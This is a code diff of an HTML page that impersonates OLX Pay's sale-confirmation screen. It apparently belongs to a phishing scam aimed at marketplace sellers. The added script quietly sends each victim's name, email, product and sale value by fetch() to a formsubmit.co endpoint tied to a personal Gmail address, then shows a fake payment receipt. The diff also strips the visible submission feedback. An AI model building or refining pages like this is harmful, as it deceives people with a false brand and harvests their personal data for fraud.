@@ -95,12 +95,6 @@
       text-align: center;
       margin-top: 20px;
     }
-
-    .cadeado {
-      width: 22px;
-      vertical-align: middle;
-      margin-right: 8px;
-    }
   </style>
 </head>
 <body>
@@ -108,11 +102,11 @@
   <!-- Tela de Formulário -->
   <div id="formulario">
     <h2>
-      <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" class="cadeado" alt="cadeado">
+      <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Cadeado" style="width:20px;vertical-align:middle;margin-right:5px;">
       OLX Pay - Confirmação de Venda
     </h2>
 
-    <form id="vendaForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <form id="vendaForm">
       <label for="nome">Seu nome completo:</label>
       <input type="text" id="nome" name="nome" required>
 
@@ -124,10 +118,6 @@
 
       <label for="valor">Valor da venda (R$):</label>
       <input type="text" id="valor" name="valor" required>
-
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="box">
-      <input type="hidden" name="_autoresponse" value="Recebemos sua confirmação. Aguarde o envio.">
 
       <button type="submit" class="btn">Confirmar venda</button>
     </form>
@@ -172,14 +162,26 @@
   <script>
     document.getElementById("vendaForm").addEventListener("submit", function (e) {
       e.preventDefault();
+
       const form = e.target;
-      document.getElementById("produtoInfo").innerText = form.produto.value;
-      document.getElementById("valorInfo").innerText = "R$ " + form.valor.value;
+      const dados = {
+        nome: form.nome.value,
+        email: form.email.value,
+        produto: form.produto.value,
+        valor: form.valor.value
+      };
+
+      document.getElementById("produtoInfo").innerText = dados.produto;
+      document.getElementById("valorInfo").innerText = "R$ " + dados.valor;
       document.getElementById("formulario").classList.add("hidden");
       document.getElementById("comprovante").classList.remove("hidden");
 
-      // Enviar para o FormSubmit
-      form.submit();
+      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dados)
+      });
+
     });
 
     function irParaFinal() {
